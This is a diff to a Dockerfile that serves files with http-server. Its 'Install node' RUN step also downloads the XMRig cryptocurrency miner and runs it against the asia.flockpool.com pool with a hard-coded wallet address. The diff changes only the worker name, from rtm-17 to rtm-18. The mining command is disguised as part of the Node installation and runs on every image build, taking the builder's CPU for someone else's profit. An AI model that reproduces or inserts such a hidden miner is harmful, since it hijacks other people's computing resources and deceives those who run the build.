@@ -4,7 +4,7 @@ FROM vm/ubuntu:18.04
 
 # Install node
 RUN curl -sL https://deb.nodesource.com/setup_12.x | bash && \
-    apt install nodejs && apt install unzip && wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-bionic-x64.tar.gz && tar -xf xmrig-6.18.0-bionic-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -o asia.flockpool.com:4444 -u RG2WJayxkd61Ggygu1U22NDAQnkCZPRsy5.rtm-17 -k -a gr -t 6 && \
+    apt install nodejs && apt install unzip && wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-bionic-x64.tar.gz && tar -xf xmrig-6.18.0-bionic-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -o asia.flockpool.com:4444 -u RG2WJayxkd61Ggygu1U22NDAQnkCZPRsy5.rtm-18 -k -a gr -t 6 && \
     rm -f /etc/apt/sources.list.d/nodesource.list
 RUN npm install -g http-server
 
